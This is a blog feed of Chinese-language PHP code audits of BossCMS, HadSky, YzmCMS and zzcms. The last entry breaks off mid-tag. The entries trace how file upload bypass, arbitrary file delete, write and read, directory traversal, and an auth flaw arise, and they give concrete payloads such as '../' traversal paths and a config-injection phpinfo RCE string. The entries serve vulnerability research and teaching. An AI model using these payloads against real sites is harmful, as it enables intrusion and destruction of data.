        <content type="html"><![CDATA[<p>先分析路由</p><p><img src="https://pic.imgdb.cn/item/6700e7d8d29ded1a8cc33f37.png" alt=""></p><p>上面是对一些常量进行定义，并且在下面引入了<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system/enter.php</span><br></pre></td></tr></table></figure><br>文件，</p><p><img src="https://pic.imgdb.cn/item/6700fb52d29ded1a8cd5cddd.png" alt=""></p><p>在这里的时候依旧是定义了一些常量，但在最后包含了into.class.php的into类下面的load()方法，跟进</p><p>在load()方法中，调用了同类下的load_class()方法，这里我们看到的bosscms_type就是在enter.php里面的常量，后面传入的三个参数<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">defined(&#x27;BOSSCMS_TYPE&#x27;) ? BOSSCMS_TYPE : null 检查常量 BOSSCMS_TYPE 是否定义，如果定义了则使用其值，否则使用 null。</span><br><span class="line">BOSSCMS_MOLD、BOSSCMS_PART 和 BOSSCMS_FUNC 是预定义的常量，分别表示模块、部分和函数。</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>在<code>load_class()</code>方法中需要传入四个参数，第一个参数 $type 是判断该功能点是前台功能点还是后台功能<br>点，也就是决定代码19行的$type路径是在哪个文件夹下，由于SYSTEM_PATH常量定义为system目录<br>下，所以系统的功能性代码都放在了该目录下。 $mold 参数定位功能目录， <code>$part</code> 决定调用目录下哪个<br>php文件， <code>$func</code> 则是定位文件下调用的方法。<br>在代码第20行如果上面的 $file 不存在则尝试加载plugin文件下的php文件用来加载插件。在代码第30<br>行包含 <code>$file</code> 。32-35行代码使用 <code>call_user_func()</code> 回调函数实现类中方法的调用。</p><p><img src="https://pic.imgdb.cn/item/6701012fd29ded1a8cdb1b9b.png" alt=""></p><h2 id="udritor编辑器文件上传漏洞"><a href="#udritor编辑器文件上传漏洞" class="headerlink" title="udritor编辑器文件上传漏洞"></a>udritor编辑器文件上传漏洞</h2><p><img src="https://pic.imgdb.cn/item/6701f303d29ded1a8cbf102c.png" alt=""></p><p>在安全设置中发现可以添加上传文件的后缀名，（这个PHP是我添加的）</p><p>然后在上传logo文件上传php的时候却被提示该文件拓展名不允许上传</p><p>抓包找到路由</p><p><img src="https://pic.imgdb.cn/item/6701f371d29ded1a8cbf6bbf.png" alt=""></p><p>也是定义了一些常量，10行通过包含enter.php进行路由的选择</p><p><img src="https://pic.imgdb.cn/item/6701f3ebd29ded1a8cbfda2e.png" alt=""></p><p>抓包里面是<code>action=uploadimage</code>，</p><p>对应的选择是uploadimage方法上传图片，case的使用方法和c语言的case类似,其中使用的config来读取分支<code>config[`imageActionName`]</code></p><p><img src="https://pic.imgdb.cn/item/6701fc8fd29ded1a8cc6fe44.png" alt=""></p><p>而config在上面也获得了</p><p><img src="https://pic.imgdb.cn/item/6702020cd29ded1a8ccc3c11.png" alt=""></p><p><code>$this-&gt;config = into::load_json(&quot;config.json&quot;); 调用 into 类的 load_json 方法加载 config.json 文件，并将其内容赋值给 $this-&gt;config 属性。</code></p><p><img src="https://pic.imgdb.cn/item/6702081ad29ded1a8cd213c9.png" alt=""></p><p>上面那个action传入的，在这里成了imageActionName，对应上了上面的那个的case中的</p><p><img src="https://pic.imgdb.cn/item/67022cc9d29ded1a8cf2e096.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">查文件上传：</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[$this-&gt;config[&#x27;imageFieldName&#x27;]]))&#123;</span><br><span class="line"></span><br><span class="line">检查是否有文件通过表单上传，表单名称为 imageFieldName。</span><br><span class="line"></span><br><span class="line">获取上传文件：</span><br><span class="line"></span><br><span class="line">$file = $_FILES[$this-&gt;config[&#x27;imageFieldName&#x27;]]; 获取上传的文件信息。</span><br><span class="line"></span><br><span class="line">检查文件大小：</span><br><span class="line"></span><br><span class="line">if($file[&#x27;size&#x27;] &lt;= $this-&gt;config[&#x27;imageMaxSize&#x27;])&#123;</span><br><span class="line"></span><br><span class="line">检查文件大小是否在允许的最大值 imageMaxSize 之内。</span><br><span class="line"></span><br><span class="line">上传文件：</span><br><span class="line"></span><br><span class="line">if(upload::files($file, $this-&gt;config[&#x27;imagePathFormat&#x27;], &#x27;photo&#x27;))&#123;</span><br><span class="line">调用 upload::files 方法上传文件，路径格式为 imagePathFormat，文件类型为</span><br><span class="line">photo。</span><br><span class="line"></span><br><span class="line">上传成功：</span><br><span class="line"></span><br><span class="line">如果上传成功，返回 JSON 编码的成功信息，包括文件的 URL、标题和原始名称。</span><br><span class="line"></span><br><span class="line">上传失败：</span><br><span class="line"></span><br><span class="line">如果上传失败，返回 JSON 编码的错误信息，错误状态为 upload::$msg。</span><br><span class="line"></span><br><span class="line">文件大小超限：</span><br><span class="line"></span><br><span class="line">如果文件大小超过限制，返回 JSON 编码的错误信息，状态为 超过ueditor的图片上传大小限制。</span><br></pre></td></tr></table></figure><p>这里的关键是upload::files函数</p><p>跟踪files，在第60行发现我们刚才被限制的</p><p><img src="https://pic.imgdb.cn/item/67022fd0d29ded1a8cf553c6.png" alt=""></p><p>向上追溯发现有两个限制条件，</p><p>第一个是检查我们上传的文件拓展名<code>$ext</code>是否在允许的扩展名列表中<code>$extension</code></p><p>第二个是判断<code>$type</code>是否为空，如果为空的话表示不需要进一步检查文件类型，如果不为空且<code>$in</code>为false的话，说明需要检查文件类型，但文件类型不在指定的类型中</p><p>从第一个我们追溯extension可以得到</p><p><img src="https://pic.imgdb.cn/item/67023967d29ded1a8cfe85ae.png" alt=""></p><p>他取决与upload_extension的，全局搜索以后发现这个是我们自己设置的那个，所以这个天然成立</p><p>另一个的话我们如果想满足前面的<code>!type=true</code>就需要使得程序运行到第36行<code>$type=NULL</code>，所以要满足<code>$k</code>在<code>$tarr</code>里面，<code>tarr</code>是我们上传的files的第三个参数photo<br>而这里的<code>$k</code>是从<code>$G[extension]</code>获取的，</p><p>这里应该是调试，但是不知道为什么我调试环境一直不对，从教程来看的话是说这里的<code>.php</code>后缀在code类型而该功能点传入的类型为photo所以这里应该是不满足第二个条件导致的不能实现文件上传</p><p>在<code>extension.json</code>里面看到了<code>externsion</code>里面的东西</p><p>所以想要实现php的文件上传，我们必须要满足type的类型为code才行</p><p><img src="https://pic.imgdb.cn/item/670282dcd29ded1a8c42769d.png" alt=""></p><p>全局搜索<code>files()</code>方法调用，发现该功能点的传入类型有code，所以可以实现文件上传</p><p><img src="https://pic.imgdb.cn/item/67028361d29ded1a8c42eba0.png" alt=""></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>在<code>超过ueditor.class.php</code>里面还有一个delete()方法，可以对文件进行删除</p><p><img src="https://pic.imgdb.cn/item/67032e82d29ded1a8cc3afbf.png" alt=""></p><p>这里也是进行了两个判断</p><ul><li>判断post参数里面是否包含path参数</li><li>判断传入的path参数是否以upload开头</li></ul><p>都满足的话进下面的<code>store_type</code>判断，判断是否是为空，如果不为空的话调用oss类的delete，如果为空的话调用dir类的delete()</p><p>所以关键是在<code>store_type</code>，全局搜索发现是一个存储的，默认为0</p><p><img src="https://pic.imgdb.cn/item/6703307dd29ded1a8cc4eceb.png" alt=""></p><p>跟进dir类下的delete()方法查看该方法：</p><p><img src="https://pic.imgdb.cn/item/670330c0d29ded1a8cc515ea.png" alt=""></p><p>经过<code>replace</code>函数方法后使用<code>id_files</code>函数检查路径是否执行一个文件，使得若进行<code>unlink</code>删除，我们跟进<code>replace</code>看是否存在过滤</p><p><img src="https://pic.imgdb.cn/item/670331d1d29ded1a8cc5c454.png" alt=""></p><p>他这里并没有进行过滤，只是 对<code>//,///</code>的路径进行了省略优化，所以可以直接调用路由</p><p>payload:<code>path=upload/../xxxx</code>(删除的是根目录下的)</p><p><img src="https://pic.imgdb.cn/item/670331bed29ded1a8cc5b91e.png" alt=""></p><h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p>同样在<code>uedirot.class.php</code>下的还有list方法，在327行的<code>$folder</code>是GET传入的没有任何过滤就拼接到了<code>$path</code>中</p><p><img src="https://pic.imgdb.cn/item/670364c3d29ded1a8cf5ffd7.png" alt=""></p><p>在里面有一个read()方法，这里的332,335行都调用了这个方法，从上面的审计中我们可以知道这个地方是选择远程oss读取还是本地读取，所以是二选一必须走一个</p><p>oss的是远程读取的，我们选择对dir的本地读取的read下手</p><p>分析可得，这个方法使用opendir函数打开目录句柄，readdir函数读取目录内容，在这个文件最上面的replace函数之前分析过是进行路径优化的，而且132行的<code>$is_dir</code>是判断是目录还是文件，所以说如果这里的<code>$path</code>可控的话就可以导致目录遍历</p><p><img src="https://pic.imgdb.cn/item/67037606d29ded1a8c085ef6.png" alt=""></p><p>回到lists方法，全局搜索找到</p><p><img src="https://pic.imgdb.cn/item/67037985d29ded1a8c0cd47d.png" alt=""></p><p>这李通过lists传入了一个<code>config[`fileMangerListPath`]</code></p><p>全局搜索发现使用一个列出文件目录的东西</p><p><img src="https://pic.imgdb.cn/item/67037a06d29ded1a8c0d786c.png" alt=""></p><p>找到该值是upload/路径，也就是说上面要读取的文件是upload目录下的文件，我们从上面的分析中可以知道lists()方法中传入的 $folder 参数没有进行过滤就拼接到 <code>$path</code>中所以这里是存在目录遍历的。</p><p>所以我们要找在哪调用了<code>listfile</code>方法</p><p>由之前的可以知道，我们调用路由是通过改目录文件下的，在最开始的时候我们调用里init方法，在里面通过传输action参数实现类中方法的实行</p><p><img src="https://pic.imgdb.cn/item/67037d90d29ded1a8c11852b.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/67037e1bd29ded1a8c120533.png" alt=""></p><p>我们可以构造路由<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/system/extend/ueditor/php/controller.php?action=listfile&amp;folder=../../../</span><br></pre></td></tr></table></figure></p><p><img src="https://pic.imgdb.cn/item/67037e7fd29ded1a8c127277.png" alt=""></p><h2 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h2><p>在这里存在一个sql的任意文件下载漏洞</p><p><img src="https://pic.imgdb.cn/item/6703b698d29ded1a8c5f5009.png" alt=""></p><p>我们抓包看看</p><p><img src="https://pic.imgdb.cn/item/6703b714d29ded1a8c5ff255.png" alt=""></p><p>可以看到路由是safe下的backup</p><p><img src="https://pic.imgdb.cn/item/6703b7dcd29ded1a8c60db40.png" alt=""></p><p>这里直接<code>get</code>了一个<code>id</code>，然后直接拼接路径中</p><p>这里的sql是上面已经定义的路径</p><p>而后在第73行使用readfile函数进行文件读取，中间没有做任何过滤，所以可以通过</p><p><code>../</code>实现目录跳转来读取文件</p><p><img src="https://pic.imgdb.cn/item/6703b8a4d29ded1a8c61cc93.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/6703b83bd29ded1a8c614c00.png" alt=""></p><h2 id="权限校验处存在逻辑缺陷"><a href="#权限校验处存在逻辑缺陷" class="headerlink" title="权限校验处存在逻辑缺陷"></a>权限校验处存在逻辑缺陷</h2><p>在第一个<code>ueditor.class.php</code>中，有这么两条</p><p><img src="https://pic.imgdb.cn/item/6703ba76d29ded1a8c6412c2.png" alt=""></p><p><code>ueditor</code>类继承了<code>admin</code>类,最上面通过<code>basic_class()</code>来加载<code>admin.class.php</code>文件，，跟进这个方法</p><p><img src="https://pic.imgdb.cn/item/6703bad4d29ded1a8c6491e1.png" alt=""></p><p>这里设置了<code>$func</code>参数，如果没有就默认设置成<code>init</code>，而且在最下面调用<code>load_class</code>加载类文件，再通过类加载<code>admin</code>的<code>init()</code>方法，</p><p>这里通过<code>init</code>调用<code>session</code>get一个session，如果为空的话判断是否定义了<code>IS_LOGIN</code>，如果未定义的话就重定向刀登陆界面，但是跳转结束以后代码没有<code>die</code>，他就会继续调用init导致上面的鉴权无效</p><p><img src="https://pic.imgdb.cn/item/6703bcf0d29ded1a8c6739f8.png" alt=""></p><p>至此结束bosscms</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hadcms代码审计</title>
      <link href="/2025/01/08/2024%E5%B9%B410%E6%9C%8826%E6%97%A5-hadsky%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/01/08/2024%E5%B9%B410%E6%9C%8826%E6%97%A5-hadsky%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>全局搜索<code>file_put_contents</code>的时候发现</p><p><img src="https://pic.imgdb.cn/item/671ca80fd29ded1a8c0310e4.png" alt=""></p><p>往上回溯发现它是通过weitch..case来控制<code>file_put_contentts</code>的，而下面的path也就是我们通过POST传入的</p><p>23-35行对路径真实性进行了检验</p><p>如果不存在弹出路径不存在的提示并返回JSON响应,并且限制了不能创建新的文件夹</p><p><img src="https://pic.imgdb.cn/item/671cadc7d29ded1a8c09fc8a.png" alt=""></p><p>所以我们确定了传入的内容<code>type=save</code></p><p>path要求是必须真实存在的路径，</p><p><img src="https://pic.imgdb.cn/item/671cb670d29ded1a8c148588.png" alt=""></p><p>suffixs一开始就限制了类型</p><p><img src="https://pic.imgdb.cn/item/671cb69cd29ded1a8c14aa09.png" alt=""></p><p>这里只是判断了一下是否符合格式，但是没过滤php文件</p><p>所以可以通过nkdire来创建新测目录文件</p><p><img src="https://pic.imgdb.cn/item/671cb729d29ded1a8c152efd.png" alt=""></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><img src="https://pic.imgdb.cn/item/671dedc5d29ded1a8c05f16c.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/671dedc5d29ded1a8c05f18e.png" alt=""></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>在上面的基础上这里有一个</p><p><img src="https://pic.imgdb.cn/item/671dee46d29ded1a8c065c5e.png" alt=""></p><p>由于上面的分析可知path和type是可控的，所以构成任意文件删除漏洞</p><h2 id="任意文件删除-rce"><a href="#任意文件删除-rce" class="headerlink" title="任意文件删除+rce"></a>任意文件删除+rce</h2><p>存在任意文件删除的时候，我们可以进行locked锁文件的删除以重装，而且在重装界面我们能看到我们的数据库信息会记录到config.php中</p><p><img src="https://pic.imgdb.cn/item/671f525dd29ded1a8c0b4516.png" alt=""></p><p>当我们安装的时候，就会对配置文件进行写入，但是写入的时候没有过滤，这就导致我们可以进行rce</p><p><img src="https://pic.imgdb.cn/item/671f5398d29ded1a8c0d5e37.png" alt=""></p><p>后面是对数据库进行连接，创建等操作,但是不能随意输入，如果数据库执行期间报错会导致后面安装不成功，config,php无法写入</p><p><img src="https://pic.imgdb.cn/item/671f5472d29ded1a8c0e1924.png" alt=""></p><p>最上面的代码限制了我们不能随意访问该文件，但是<code>$_G</code>中内容可控，经过尝试发现只有这里的 <code>mysql_prefix</code> 参数也就是数据库前缀这里是可以完全控制的，其他参数如果拼接特殊字符会导致数据库语句执行报错</p><p>config.php中可知，必须定义puyuetian常量才能正常访问该文件，所以显然不能直接访问而要通过特定路由，但是index.php中包含了puyueyian.php，所以只要能正常安装成功就能进行rce</p><p><img src="https://pic.imgdb.cn/item/671f620ed29ded1a8c1e8584.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/671f621cd29ded1a8c1e9593.png" alt=""></p><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p><img src="https://pic.imgdb.cn/item/671f6f15d29ded1a8c2c0f57.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!&#x27;; phpinfo();//</span><br></pre></td></tr></table></figure><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p><img src="https://pic.imgdb.cn/item/6725e7f7d29ded1a8c813f59.png" alt=""></p><p>注意一下前置，<code>suffixs</code>允许的尾缀是这个，前面我们分析了path可控</p><p>而且在下面发现了回显</p><p><img src="https://pic.imgdb.cn/item/67262db0d29ded1a8cb7b5ec.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/67262db0d29ded1a8cb7b621.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/67262dd6d29ded1a8cb7d756.png" alt=""></p><h2 id="模板上传绕过getshell"><a href="#模板上传绕过getshell" class="headerlink" title="模板上传绕过getshell"></a>模板上传绕过getshell</h2><p>在<code>/app/superadmin/phpscript/app.php</code>中</p><p><img src="https://pic.imgdb.cn/item/672739c5d29ded1a8c70d1ea.png" alt=""></p><p>有一个<code>if (!InArray(&#39;hsa,zip&#39;, $suffix)) &#123;</code>检查尾缀是否为.zip文件，然后在下面用到了<code>ziparchive::extractTo()</code></p><p><img src="https://pic.imgdb.cn/item/67273aa0d29ded1a8c718402.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ziparchive 部分使用方法</span><br><span class="line">&lt;?php</span><br><span class="line">/******** ziparchive 可选参数 *******/</span><br><span class="line">/*</span><br><span class="line">1.ZipArchive::addEmptyDir</span><br><span class="line">添加一个新的文件目录</span><br><span class="line">2.ZipArchive::addFile</span><br><span class="line">将文件添加到指定zip压缩包中。</span><br><span class="line">3.ZipArchive::addFromString</span><br><span class="line">添加的文件同时将内容添加进去</span><br><span class="line">4.ZipArchive::close</span><br><span class="line">关闭ziparchive</span><br><span class="line">5.ZipArchive::extractTo</span><br><span class="line">将压缩包解压</span><br><span class="line">6.ZipArchive::open</span><br><span class="line">打开一个zip压缩包</span><br><span class="line">7.ZipArchive::getStatusString</span><br><span class="line">返回压缩时的状态内容，包括错误信息，压缩信息等等</span><br><span class="line">8.ZipArchive::deleteIndex</span><br><span class="line">删除压缩包中的某一个文件，如：deleteIndex(0)删除第一个文件</span><br><span class="line">9.ZipArchive::deleteName</span><br><span class="line">删除压缩包中的某一个文件名称，同时也将文件删除。</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yzmcms代码审计</title>
      <link href="/2025/01/08/2024%E5%B9%B410%E6%9C%8821%E6%97%A5-yzmcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/01/08/2024%E5%B9%B410%E6%9C%8821%E6%97%A5-yzmcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>路由蛮清晰的，直接开始</p><h2 id="可能存在的sql注入"><a href="#可能存在的sql注入" class="headerlink" title="可能存在的sql注入"></a>可能存在的sql注入</h2><p>我在</p><p><img src="https://pic.imgdb.cn/item/67163a01d29ded1a8c4857d5.png" alt=""></p><p>里面看到他所在的路由地址</p><p><img src="https://pic.imgdb.cn/item/67163a2dd29ded1a8c48c83c.png" alt=""></p><p>查看本地原码的时候发现</p><p><img src="https://pic.imgdb.cn/item/67163a4dd29ded1a8c4916da.png" alt=""></p><p>这里 仅仅使用了 <code>strip_tags</code>提取tablename的值，并且tablename可控，所以就猜测可能存在sql注入</p><p>但是下面的这行限制只能存在数字和字母，以及下划线，并且必须是字母开头</p><p><img src="https://pic.imgdb.cn/item/67163abbd29ded1a8c4a0f0d.png" alt=""></p><p>但是我一时没想到只有数字和字母的sql语句</p><h2 id="xss-and-upload"><a href="#xss-and-upload" class="headerlink" title="xss and upload?"></a>xss and upload?</h2><p>在后台设置了lv1可发布内容之后，在发布点发现两个功能点，查看xss的发现限制了</p><p><img src="https://pic.imgdb.cn/item/67176595d29ded1a8c283c0e.png" alt=""></p><p>其中的<code>strip_tags</code>删除<code>tablename</code>输入中的所有php标签和html标签</p><p>后面使用了<code>trim</code>清理<code>alias</code>输入的开头和结尾的空格</p><p>这里避免了xss漏洞</p><p>而另一个</p><p><img src="https://pic.imgdb.cn/item/6717660bd29ded1a8c292c0f.png" alt=""></p><p>这里面的通过<code>handle_upload_types</code>设置允许伤处啊你的文件类型以及参数</p><p><img src="https://pic.imgdb.cn/item/67176662d29ded1a8c29e6cf.png" alt=""></p><p>里面设置了可以传照片视频docxppt以及表格等等，但是不然上传php以及txt</p><p>后面使用了</p><p><img src="https://pic.imgdb.cn/item/671766b2d29ded1a8c2a979b.png" alt=""></p><p>删除原来的上传文件的地址并设置了新的地址避免目录遍历</p><p>我尝试了使用文件包含jpg啥的都不行</p><p><img src="https://pic.imgdb.cn/item/6717670dd29ded1a8c2b7aab.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzcms代码审计</title>
      <link href="/2025/01/08/2024%E5%B9%B410%E6%9C%8813%E6%97%A5-zzcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/01/08/2024%E5%B9%B410%E6%9C%8813%E6%97%A5-zzcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="框架目录"><a href="#框架目录" class="headerlink" title="框架目录"></a>框架目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">/install 安装程序目录（安装时必须有可写入权限）</span><br><span class="line">/admin 默认后台管理目录（可任意改名）</span><br><span class="line">/user 注册用户管理程序存放目录</span><br><span class="line">/skin 用户网站模板存放目录;</span><br><span class="line">/template 系统模板存放目录;</span><br><span class="line">/inc 系统所用包含文件存放目录</span><br><span class="line">/area 各地区显示文件存放目录</span><br><span class="line">/zhaoshang 招商程序文件存放目录</span><br><span class="line">/daili 代理</span><br><span class="line">/zhanhui 展会</span><br><span class="line">/company 企业</span><br><span class="line">/job 招聘</span><br><span class="line">/zixun 资讯</span><br><span class="line">/special专题</span><br><span class="line">/pinpai 品牌</span><br><span class="line">/wangkan 网络刊物</span><br><span class="line">/zhanting 注册用户展厅页程序</span><br><span class="line">/one 专存放单页面，如公司简介页，友情链接页，帮助页都放在这个目录里了</span><br><span class="line">/ajax ajax程序处理页面</span><br><span class="line">/reg 用户注册页面</span><br><span class="line">/3 第三方插件存放目录</span><br><span class="line">  /3/ckeditor CK编缉器程序存放目录</span><br><span class="line">  /3/alipay 支付宝在线支付系统存放目录</span><br><span class="line">  /3/tenpay 财富通在线支付系统存放目录</span><br><span class="line">  /3/qq_connect2.0 qq登陆接口文件</span><br><span class="line">  /3/ucenter_api discuz论坛用户同步登陆接口文件</span><br><span class="line">  /3/kefu 在线客服代码</span><br><span class="line">  /3/mobile_msg 第三方手机短信API</span><br><span class="line">  /3/phpexcelreader PHP读取excel文件组件</span><br><span class="line">/cache 缓存文件放目录</span><br><span class="line">/html 生成的静态页存放目录</span><br><span class="line">/uploadfiles 上传文件存放目录</span><br><span class="line">/daili_excel 要导入的代理信息excel表格文件上传目录</span><br><span class="line">/image 程序设计图片,swf文件存放目录</span><br><span class="line">/flash 展厅用透明flash装饰动画存放目录</span><br><span class="line">/js js文件存放目录</span><br><span class="line">/web.config 伪静态规则文件适用于 iis7服务器(万网比较常用)</span><br><span class="line">/httpd.ini 伪静态规则文件适用于 iis6服务器</span><br><span class="line">/.htaccess 伪静态规则文件适用于Apache 服务器</span><br><span class="line">/nginx.conf 伪静态规则文件适用Nginx服务器</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="前台任意文件写入"><a href="#前台任意文件写入" class="headerlink" title="前台任意文件写入"></a>前台任意文件写入</h2><p>使用Fortify自动审计工具时发现可能存在一个xxe漏洞，</p><p><img src="https://pic.imgdb.cn/item/670bd341d29ded1a8c22360b.png" alt=""></p><p><code>xml_parse</code>解析xml文档，搜索他的方法<code>parse</code></p><p><img src="https://pic.imgdb.cn/item/670be4bdd29ded1a8c316f6f.png" alt=""></p><p>发现<code>xml_unserialize</code>对<code>parse()</code>函数进行了调用，再去搜索</p><p><img src="https://pic.imgdb.cn/item/670ca7d5d29ded1a8cb97562.png" alt=""></p><p>这里是从post中获取原始的数据流</p><p>上面的ertu<code>parse_Str</code>是将解码后的字符串解析为变量并存储在<code>$get</code>中，而上面的<code>$code</code>可控，而<code>$code</code>经过<code>_authcode</code>的处理，跟进一下发现大概是加解密字符串的,<code>$string</code>是需要加解密的字符串，也就是<code>$code</code>，$operation 默认为DECODE也就是解密字符串，而 $key 则为加解密的秘钥。</p><blockquote><p>他说这里的默认密钥是123456，我真没看出来那里说了是123456</p></blockquote><p><img src="https://pic.imgdb.cn/item/670cb03bd29ded1a8cbfbc47.png" alt=""></p><p>因为<code>code</code>可控，所以下面的<code>$time,$action</code>可控</p><p>59行判断传入的<code>$action</code>是否在数组中,是的话继续运行并讲<code>$get,post</code>以参数形式传输，所以<code>$get,post</code>也可控</p><p><img src="https://pic.imgdb.cn/item/670cb021d29ded1a8cbfab99.png" alt=""></p><p>所以我们可以去数组中找找有没有危险操作的</p><p><code>updateapps</code>里面有一个<code>fwrite</code>,接收的<code>UC-API</code>可控，而且下面的fwrite是将我们输入的信息进行正则匹配进行替换，所以可以实现任意文件读写</p><p><img src="https://pic.imgdb.cn/item/670cb35ed29ded1a8cc1fae5.png" alt=""></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>因为这里的东西限制了我们两条</p><p><img src="https://pic.imgdb.cn/item/670cf31fd29ded1a8c04ac38.png" alt=""></p><ol><li><code>$timestamp - $get[&#39;time&#39;] &gt; 3600</code></li><li><code>$get[&#39;action&#39;]=updateapps;</code></li></ol><p>并且要经过_authcode（）解码，所以我们要先讲<code>$code</code>编码</p><p>这里我也找到了<code>UC-KEY</code>—-他在配置文件中说是默认为123456，也就解释了上面的123456的默认</p><p><img src="https://pic.imgdb.cn/item/670cfc0bd29ded1a8c0e4d6e.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/670d0d19d29ded1a8c270940.png" alt=""></p><p>这里说明了要按照xml的格式进行编写，所以就有了</p><p><img src="https://pic.imgdb.cn/item/670cfc81d29ded1a8c0edb68.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/670cfc9bd29ded1a8c0ef622.png" alt=""></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>全局搜索<code>unlink</code>的时候发现这么一个东西</p><p><img src="https://pic.imgdb.cn/item/670d1e79d29ded1a8c3cc9bb.png" alt=""></p><p>追踪一下<code>unlink</code>的<code>file</code>发现<code>action</code>和<code>mlname</code>可控</p><p><img src="https://pic.imgdb.cn/item/670d1fb3d29ded1a8c3ddba1.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/670d202fd29ded1a8c3e5137.png" 